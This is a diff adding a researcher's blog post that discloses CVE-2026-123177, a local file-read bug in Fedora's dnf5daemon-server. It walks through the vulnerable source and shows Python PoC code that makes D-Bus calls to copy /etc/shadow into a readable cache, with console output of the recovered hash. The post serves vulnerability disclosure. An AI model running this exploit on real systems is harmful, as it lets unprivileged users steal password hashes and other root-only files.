@@ -1,0 +1,160 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-site-verification" content="B_-ZMaSKIKALjwlncbeuol3oMAFud2aTqj2W2kJ8FlY">
+  
+  <meta name="robots" content="index, follow">
+  
+  <meta name="description" content="CVE-2026-123177: an unprivileged DNF5 query makes the root daemon copy local files into its readable cache.">
+  <title>One DNF5 query away from /etc/shadow: CVE-2026-123177</title>
+  <link rel="canonical" href="https://asimuntis.github.io/posts/fedora-dnf5daemon-root-file-read/">
+  
+  <link rel="stylesheet" href="/css/site.min.2f9ea0833f0feee59d1082ec6831749d2250e5a85db67ceb4080545dc327793f.css" integrity="sha256-L56ggz8P7uWdEILsaDF0nSJQ5ahdtnzrQIBUXcMneT8=">
+</head>
+<body>
+  
+  <header class="site-head">
+    <nav aria-label="Primary">[ <a href="/">home</a> ]</nav>
+  </header>
+  
+
+  <main>
+    
+  <article class="post">
+    <header>
+      
+      <h1>One DNF5 query away from /etc/shadow: <span class="cve-id">CVE-2026-123177</span></h1>
+      <p class="meta"><time datetime="2026-11-14">2026-11-14</time></p>
+      
+      <p class="tags"><a href="/tags/linux/">linux</a> / <a href="/tags/dnf5/">dnf5</a> / <a href="/tags/dbus/">dbus</a> / <a href="/tags/polkit/">polkit</a> / <a href="/tags/fedora/">fedora</a> / <a href="/tags/cve-2026-123177/">cve-2026-123177</a></p>
+      
+    </header>
+    <div class="content">
+      
+      
+      <img class="distro-lead" src="/img/distros/fedora.svg" alt="Fedora logo" width="56" height="56">
+      
+      <p>Recent Fedora Workstation releases install <code>dnf5daemon-server</code>, a root service
+on the system bus. Any local user can call <code>Rpm.list()</code>, and its package
+patterns can be URLs. Before touching DNF5, the account could not read
+<code>/etc/shadow</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span><span style="color:#8b949e">$</span> id
+</span></span><span style="display:flex;"><span><span style="color:#8b949e">uid=1001(poc) gid=1001(poc) groups=1001(poc)
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">$</span> head -1 /etc/shadow
+</span></span><span style="display:flex;"><span><span style="color:#8b949e">head: cannot open &#39;/etc/shadow&#39; for reading: Permission denied
+</span></span></span></code></pre></div><p>I handed <code>/etc/shadow</code> to <code>Rpm.list()</code> as a <code>file://</code> pattern. The answer was
+<code>not a rpm</code>. Fair enough, except the daemon waited until after copying
+<code>/etc/shadow</code> into its package cache as a root-owned <code>0644</code> file. A
+low priv user could read the copy. Red Hat assigned the bug
+<a href="https://access.redhat.com/security/cve/cve-2026-123177">CVE-2026-123177</a>.</p>
+<p>I ran the PoC over SSH. It talks straight to <code>Rpm.list()</code> on the system bus,
+without a polkit check.</p>
+<h2 id="tested-systems">Tested systems</h2>
+<p>I tested Fedora Workstation with SELinux enforcing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Fedora 44: dnf5daemon-server-5.4.6.0-1.fc44.x86_64
+</span></span><span style="display:flex;"><span>Fedora 45: dnf5daemon-server-5.4.7.0-1.fc45.x86_64
+</span></span><span style="display:flex;"><span>Fedora 46 Rawhide (20261112.n.0): dnf5daemon-server-5.4.7.0-1.fc46.x86_64
+</span></span></code></pre></div><p>On all three systems, D-Bus started the daemon as root on demand.</p>
+<h2 id="a-package-pattern-can-be-a-url">A package pattern can be a URL</h2>
+<p><code>Rpm.list()</code> accepts a <code>patterns</code> array. In
+<a href="https://github.com/rpm-software-management/dnf5/blob/1b2de4bdc2f25a6de2884fb2cf81f80a8ce2a567/dnf5daemon-server/services/rpm/rpm.cpp#L401-L410"><code>dnf5daemon-server/services/rpm/rpm.cpp:401-410</code></a>,
+those strings go straight to <code>add_cmdline_packages()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>std<span style="color:#ff7b72;font-weight:bold">::</span>vector<span style="color:#ff7b72;font-weight:bold">&lt;</span>std<span style="color:#ff7b72;font-weight:bold">::</span>string<span style="color:#ff7b72;font-weight:bold">&gt;</span> patterns <span style="color:#ff7b72;font-weight:bold">=</span>
+</span></span><span style="display:flex;"><span>    dnfdaemon<span style="color:#ff7b72;font-weight:bold">::</span>key_value_map_get<span style="color:#ff7b72;font-weight:bold">&lt;</span>std<span style="color:#ff7b72;font-weight:bold">::</span>vector<span style="color:#ff7b72;font-weight:bold">&lt;</span>std<span style="color:#ff7b72;font-weight:bold">::</span>string<span style="color:#ff7b72;font-weight:bold">&gt;&gt;</span>(
+</span></span><span style="display:flex;"><span>        options, <span style="color:#a5d6ff">&#34;patterns&#34;</span>, std<span style="color:#ff7b72;font-weight:bold">::</span>vector<span style="color:#ff7b72;font-weight:bold">&lt;</span>std<span style="color:#ff7b72;font-weight:bold">::</span>string<span style="color:#ff7b72;font-weight:bold">&gt;</span>{});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">auto</span> <span style="color:#ff7b72;font-weight:bold">&amp;</span> [path, package] <span style="color:#ff7b72;font-weight:bold">:</span> base<span style="color:#ff7b72;font-weight:bold">-&gt;</span>get_repo_sack()<span style="color:#ff7b72;font-weight:bold">-&gt;</span>add_cmdline_packages(patterns)) {
+</span></span><span style="display:flex;"><span>    cmdline_packages.push_back(std<span style="color:#ff7b72;font-weight:bold">::</span>move(package));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Package patterns are normally names, but <code>add_cmdline_packages()</code> also
+recognizes local RPM paths and URLs. There is no polkit check in
+<a href="https://github.com/rpm-software-management/dnf5/blob/1b2de4bdc2f25a6de2884fb2cf81f80a8ce2a567/dnf5daemon-server/services/rpm/rpm.cpp#L590-L612"><code>Rpm.list()</code></a>
+before the query reaches it; package queries are meant to be harmless. Usually
+they are. :)</p>
+<p>The PoC sends a pattern like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>file:///etc/shadow?adamm-&lt;pid&gt;-&lt;timestamp&gt;.rpm
+</span></span></code></pre></div><p><code>file://</code> selects the file. The query does not change what gets opened; it gives
+the cached copy a unique <code>.rpm</code> tag that the PoC can find afterward.</p>
+<h2 id="download-now-ask-rpm-questions-later">Download now, ask RPM questions later</h2>
+<p>The next layer is
+<a href="https://github.com/rpm-software-management/dnf5/blob/1b2de4bdc2f25a6de2884fb2cf81f80a8ce2a567/libdnf5/repo/repo_sack.cpp#L224-L300"><code>libdnf5/repo/repo_sack.cpp:224-300</code></a>.
+It collects URL-like patterns, builds a filename below the command-line
+repository cache and runs the downloader:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>url_to_path.empty()) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">auto</span> <span style="color:#ff7b72;font-weight:bold">&amp;</span> logger <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">*</span>p_impl<span style="color:#ff7b72;font-weight:bold">-&gt;</span>base<span style="color:#ff7b72;font-weight:bold">-&gt;</span>get_logger();
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">// download remote URLs
+</span></span></span><span style="display:flex;"><span>    libdnf5<span style="color:#ff7b72;font-weight:bold">::</span>repo<span style="color:#ff7b72;font-weight:bold">::</span>FileDownloader downloader(p_impl<span style="color:#ff7b72;font-weight:bold">-&gt;</span>base);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">auto</span> <span style="color:#ff7b72;font-weight:bold">&amp;</span> [url, dest_path] <span style="color:#ff7b72;font-weight:bold">:</span> url_to_path) {
+</span></span><span style="display:flex;"><span>        logger.debug(<span style="color:#a5d6ff">&#34;Downloading package </span><span style="color:#79c0ff">\&#34;</span><span style="color:#a5d6ff">{}</span><span style="color:#79c0ff">\&#34;</span><span style="color:#a5d6ff"> to file </span><span style="color:#79c0ff">\&#34;</span><span style="color:#a5d6ff">{}</span><span style="color:#79c0ff">\&#34;</span><span style="color:#a5d6ff">&#34;</span>, url, dest_path.string());
+</span></span><span style="display:flex;"><span>        <span style="color:#8b949e;font-style:italic">// TODO(mblaha): temporarily used the dummy DownloadCallbacks instance
+</span></span></span><span style="display:flex;"><span>        downloader.add(std<span style="color:#ff7b72;font-weight:bold">::</span>string{url}, dest_path.string());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    downloader.download();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8b949e;font-style:italic">// fill the command line repo with downloaded URLs
+</span></span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">const</span> <span style="color:#ff7b72">auto</span> <span style="color:#ff7b72;font-weight:bold">&amp;</span> [url, path] <span style="color:#ff7b72;font-weight:bold">:</span> url_to_path) {
+</span></span><span style="display:flex;"><span>        path_to_package.emplace(url, cmdline_repo<span style="color:#ff7b72;font-weight:bold">-&gt;</span>add_rpm_package(path.string(), calculate_checksum));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The ordering is the bug: the daemon fetches the input as root, then asks RPM
+whether it is a package. <code>/etc/shadow</code> fails that check, but the <code>0644</code> copy
+remains in a <code>0755</code> cache directory, so a low priv user can read it.</p>
+<h2 id="triggering-the-copy">Triggering the copy</h2>
+<p>The PoC needs two D-Bus calls: open a session, then pass the tagged URL to
+<code>Rpm.list()</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>bus <span style="color:#ff7b72;font-weight:bold">=</span> Gio<span style="color:#ff7b72;font-weight:bold">.</span>bus_get_sync(Gio<span style="color:#ff7b72;font-weight:bold">.</span>BusType<span style="color:#ff7b72;font-weight:bold">.</span>SYSTEM, <span style="color:#79c0ff">None</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#ff7b72;font-weight:bold">=</span> call(
+</span></span><span style="display:flex;"><span>    bus,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;/org/rpm/dnf/v0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;org.rpm.dnf.v0.SessionManager&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;open_session&#34;</span>,
+</span></span><span style="display:flex;"><span>    GLib<span style="color:#ff7b72;font-weight:bold">.</span>Variant(<span style="color:#a5d6ff">&#34;(a</span><span style="color:#a5d6ff">{sv}</span><span style="color:#a5d6ff">)&#34;</span>, ({
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#34;load_available_repos&#34;</span>: GLib<span style="color:#ff7b72;font-weight:bold">.</span>Variant(<span style="color:#a5d6ff">&#34;b&#34;</span>, <span style="color:#79c0ff">False</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#34;load_system_repo&#34;</span>: GLib<span style="color:#ff7b72;font-weight:bold">.</span>Variant(<span style="color:#a5d6ff">&#34;b&#34;</span>, <span style="color:#79c0ff">False</span>),
+</span></span><span style="display:flex;"><span>    },)),
+</span></span><span style="display:flex;"><span>    <span style="color:#a5d6ff">&#34;(o)&#34;</span>,
+</span></span><span style="display:flex;"><span>)<span style="color:#ff7b72;font-weight:bold">.</span>unpack()[<span style="color:#a5d6ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">try</span>:
+</span></span><span style="display:flex;"><span>    call(
+</span></span><span style="display:flex;"><span>        bus,
+</span></span><span style="display:flex;"><span>        session,
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#34;org.rpm.dnf.v0.rpm.Rpm&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#34;list&#34;</span>,
+</span></span><span style="display:flex;"><span>        GLib<span style="color:#ff7b72;font-weight:bold">.</span>Variant(<span style="color:#a5d6ff">&#34;(a</span><span style="color:#a5d6ff">{sv}</span><span style="color:#a5d6ff">)&#34;</span>, ({
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;patterns&#34;</span>: GLib<span style="color:#ff7b72;font-weight:bold">.</span>Variant(<span style="color:#a5d6ff">&#34;as&#34;</span>, [url]),
+</span></span><span style="display:flex;"><span>        },)),
+</span></span><span style="display:flex;"><span>        <span style="color:#a5d6ff">&#34;(aa</span><span style="color:#a5d6ff">{sv}</span><span style="color:#a5d6ff">)&#34;</span>,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">except</span> GLib<span style="color:#ff7b72;font-weight:bold">.</span>Error:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">pass</span>  <span style="color:#8b949e;font-style:italic"># The root-side copy already happened.</span>
+</span></span></code></pre></div><p><code>Rpm.list()</code> rejects the non-RPM input, but the tagged copy is already sitting
+in the readable cache. The PoC finds that filename and copies it to <code>out</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span><span style="color:#8b949e">$</span> python3 poc.py /etc/shadow -o out
+</span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] uid=1001, direct_read=False
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[*] asking DNF5 daemon to inspect /etc/shadow
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[+] cache=/var/cache/dnf5daemon-server/... owner=0:0 mode=0644 size=1450
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">[+] recovered=out
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e">$</span> grep <span style="color:#a5d6ff">&#39;^poc:&#39;</span> out
+</span></span><span style="display:flex;"><span><span style="color:#8b949e">poc:$y$j9T$...snip...
+</span></span></span></code></pre></div><p>I wanted a shell one-liner, but <code>open_session()</code> ties its object to the D-Bus
+connection that created it. Two <code>gdbus call</code>s mean two connections, so the
+second one hits <code>UnknownObject</code>. The Python version keeps one connection open
+and ran on all three systems without adding any packages.</p>
+<p><code>/etc/shadow</code> was just the cleanest target. <code>Rpm.list()</code> also takes <code>http://</code>
+and <code>https://</code>; on Fedora 44 and 45 the daemon followed redirects within the
+same scheme and left the full response in its readable cache.</p>
+<p>Any known file path the daemon can read works the same way. I could not push
+the copy out of <code>/var/cache/dnf5daemon-server</code>, so the primitive stops at read.</p>
+
+    </div>
+  </article>
+
+  </main>
+
+  <footer><a href="https://x.com/adamsimuntis">adamm</a> · <a href="https://keys.openpgp.org/vks/v1/by-fingerprint/1A0B81CA0A51943E21888D4DAD129DEF055AE3F6" type="application/pgp-keys" title="OpenPGP fingerprint: 1A0B 81CA 0A51 943E 2188 8D4D AD12 9DEF 055A E3F6" aria-label="Download Adam Simuntis's OpenPGP public key">PGP AD129DEF055AE3F6</a></footer>
+</body>
+</html>
